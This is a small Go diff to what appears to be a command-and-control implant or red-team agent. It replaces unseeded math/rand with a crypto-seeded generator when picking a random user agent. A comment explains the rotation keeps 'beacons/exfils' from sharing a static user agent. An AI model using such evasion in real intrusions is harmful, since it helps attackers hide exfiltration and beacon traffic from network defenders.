@@ -6,7 +6,6 @@ package main
 import (
 	"encoding/json"
 	"fmt"
-	"math/rand"
 	"strconv"
 	"strings"
 	"sync"
@@ -161,8 +160,8 @@ var defaultUserAgentPool = []string{
 
 // randomUserAgent returns a UA drawn from the v2 profile pool (if set), the
 // configured UA, plus the built-in pool. Called on every outbound request so
-// no two beacons/exfils share a static UA. math/rand is concurrency-safe and
-// requires no explicit seeding.
+// no two beacons/exfils share a static UA. Uses the crypto-seeded global rng
+// (plain math/rand defaults to seed 1 and would repeat every restart).
 func randomUserAgent() string {
 	configOverrides.RLock()
 	base := UserAgent
@@ -177,7 +176,7 @@ func randomUserAgent() string {
 		}
 	}
 	pool = append(pool, defaultUserAgentPool...)
-	return pool[rand.Intn(len(pool))]
+	return pool[rng.Intn(len(pool))]
 }
 
 func getActiveUserAgentFromConfig() string {
